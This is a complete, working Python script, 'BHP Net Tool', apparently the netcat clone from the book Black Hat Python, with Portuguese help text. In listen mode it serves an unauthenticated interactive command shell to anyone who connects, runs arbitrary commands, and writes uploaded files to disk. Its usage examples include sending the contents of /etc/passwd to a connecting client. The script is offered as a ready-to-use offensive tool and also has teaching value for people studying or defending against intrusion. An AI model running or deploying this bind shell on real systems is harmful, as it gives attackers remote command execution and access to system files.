import socket
import argparse
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                file_buffer += data
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            client_socket.send(f'Salvo arquivo {self.args.upload}'.encode())
        elif self.args.command:
            while True:
                client_socket.send(b'BHP: #> ')
                cmd_buffer = b''
                while b'\n' not in cmd_buffer:
                    cmd_buffer += client_socket.recv(64)
                response = execute(cmd_buffer.decode())
                if response:
                    client_socket.send(response.encode())

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='BHP Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # faz upload de um arquivo
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # executa comando
        echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135 # Enviar texto para a porta 135 do servidor alvo
        netcat.py -t 192.168.1.108 -p 5555 # Conectar a um servidor alvo
    '''))
    parser.add_argument('-c', '--command', action='store_true', help='Inicia um shell de comando')
    parser.add_argument('-e', '--execute', help='Executa o comando especificado')
    parser.add_argument('-l', '--listen', action='store_true', help='Escuta por conexões de entrada')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Porta alvo')
    parser.add_argument('-t', '--target', default='', help='Endereço alvo')
    parser.add_argument('-u', '--upload', help='Faz upload de um arquivo e grava no caminho especificado')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()
